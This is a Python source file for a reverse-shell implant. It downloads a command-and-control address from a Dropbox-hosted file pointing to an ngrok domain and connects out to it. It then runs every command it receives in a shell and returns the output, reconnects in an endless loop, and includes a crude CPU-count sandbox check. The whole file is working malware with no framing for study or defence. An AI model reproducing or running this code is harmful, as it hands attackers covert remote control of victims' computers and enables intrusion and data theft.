import os
import re
import socket
import struct
import subprocess
import time


def c2connect():

    proc = subprocess.Popen("curl https://www.dropbox.com/s/nrt2ug738i9jfpw/ngrokdomain.txt?dl=0 --ssl-no-revoke -L", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    stdout_value = proc.stdout.read() + proc.stderr.read()
    output_str = str(stdout_value, "UTF-8")
    mainsocket = output_str.split('%')[0].replace(' ', '').split(':')

    HOST = mainsocket[0]
    PORT = int(mainsocket[1])

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))
    s.send(str.encode("\n\n[*] Connection Established!\n\n"))

    shellloop(s)

    s.close()

def shellloop(s):
    while 1:
        try:
            s.send(str.encode(os.getcwd() + "> "))
            data = s.recv(1024).decode("UTF-8")
            data = data.strip('\n')
            if data == "quit":
                s.close()
                break
            if data[:2] == "cd":
                os.chdir(data[3:])
            if len(data) > 0:
                if re.match(r'[P,p][O,o][W,w][E,e][R,r][S,s][H,h][E,e][L,l][L,l]',data) != "None" and len(data) == 10:
                    s.send(str.encode("\n" + "!!!  powershell command denied  !!!" + "\n" +"Use: _> powershell -c \"<cmd>\" Instead"+"\n\n"))
                else:
                    proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                            stdin=subprocess.PIPE)
                    stdout_value = proc.stdout.read() + proc.stderr.read()
                    output_str = str(stdout_value, "UTF-8")
                    s.send(str.encode("\n" + output_str))


        except WindowsError as e:
            print("C2 is Offline, reconnection in 1 seconds")

            time.sleep(1)
            c2connect()

        except Exception as e:
            print(e)
            continue


if __name__ == "__main__":

    if os.cpu_count() <= 2:
        print("ERROR")

    while (1):
        c2connect()
